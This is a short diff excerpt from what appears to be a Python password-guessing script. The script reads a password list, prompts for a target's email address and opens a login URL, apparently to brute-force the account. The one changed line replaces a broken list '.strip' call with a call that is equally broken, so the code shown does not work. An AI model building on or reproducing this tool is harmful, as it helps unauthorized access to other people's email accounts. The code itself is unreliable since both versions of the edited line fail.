@@ -25,7 +25,7 @@ file=open('passwords.txt','r')
 email = input("input Email of target:")
 print ("\nTarget Email ID : ",email+"")
 content = file.readlines()
-passboy = content.strip("\n")
+passboy = content("\n")
 print("[*]Fixating pass%s"%content)
 
 response = webbrowser.open(post_url)
